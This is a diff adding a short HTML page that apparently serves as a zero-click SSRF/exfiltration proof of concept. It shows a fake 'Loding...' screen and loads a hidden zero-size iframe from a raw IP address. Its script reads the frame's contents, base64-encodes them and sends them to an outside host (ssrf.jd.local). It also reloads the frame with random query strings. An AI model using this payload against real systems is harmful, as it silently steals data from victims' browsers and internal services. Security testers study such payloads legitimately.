@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>0-Click 302 Redirect</title>
+</head>
+<body>
+<h1>Loding...</h1>
+<script>
+function generateRandomNumber() {
+// 生成一个从0到999999999的随机数
+let randomNumber = Math.floor(Math.random() * 1000000000);
+// 转换为字符串c
+let randomNumberStr = randomNumber.toString();
+// 如果长度小于10，前面补零
+while (randomNumberStr.length < 10) {
+randomNumberStr = '0' + randomNumberStr;
+}
+return randomNumberStr;
+}
+function send(data){
+var http=new XMLHttpRequest();
+http.open("GET","http://ssrf.jd.local/c3f3f53c12674acdc9855f47b85299f0.html?code="+(btoa(data)));
+http.onload=function(e){var
+code=this.responseText;console.log(code)};http.send();
+}
+function check(){
+if(document.getElementById("xss").contentWindow.document.body.innerHTML!=="fail")
+{
+send(document.getElementById("xss").contentWindow.document.body.innerHTML);
+}
+else{
+document.getElementById("xss").contentWindow.location.href=document.getElementBy
+Id("xss").contentWindow.location.href="http://124.71.183.77/logtest?"+generateRandomNumber();
+}
+}</script>
+<iframe id="xss" src="http://124.71.183.77/logtest?" width="0%"
+height="0%" onload="check()" style="border:0;"></iframe>
+</body>
+</html>
